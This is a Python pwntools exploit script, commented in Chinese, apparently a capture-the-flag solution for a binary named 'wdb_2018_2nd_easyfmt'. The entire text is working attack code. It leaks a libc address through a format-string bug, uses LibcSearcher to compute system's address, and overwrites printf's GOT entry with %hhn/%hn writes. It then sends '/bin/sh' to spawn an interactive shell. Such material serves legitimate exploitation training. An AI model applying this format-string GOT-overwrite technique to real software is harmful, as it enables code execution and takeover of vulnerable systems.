from pwn import *
from LibcSearcher import *
p   = process('./wdb_2018_2nd_easyfmt')
elf = ELF('./wdb_2018_2nd_easyfmt')

# 将printf的got值改成system
printf_got = elf.got['printf']

p.recvuntil(b'Do you know repeater?\n')

# 获取system的地i址
p.send(b'%63$p')
libc_start_main = int(p.recv()[:10], 16) - 147
libc = LibcSearcher('__libc_start_main', libc_start_main)
libc_base = libc_start_main - libc.dump('__libc_start_main')
system    = libc_base + libc.dump('system')
system_l = system & 0xff           # system第一个字节的值
system_h = (system>>8) & 0xffff    # system第二三个字节的值

# 在buf储存printf的got表地址
# 通过调用printf(buf)修改buf指向的地址的值, 即printf_got
# 先写入printf_got的第一个字节, 然后写入剩下的三个字节
payload = p32(printf_got) + p32(printf_got + 1)
payload += b'%' + bytes(str(system_l - 8).encode()) + b'c%6$hhn'
payload += b'%' + bytes(str(system_h - system_l).encode()) + b'c%7$hn'

p.send(payload)
p.recv()
p.send(b'/bin/sh\x00') # printf(buf)变成了system(buf), 只需要在buf写入/bin/sh
p.interactive()
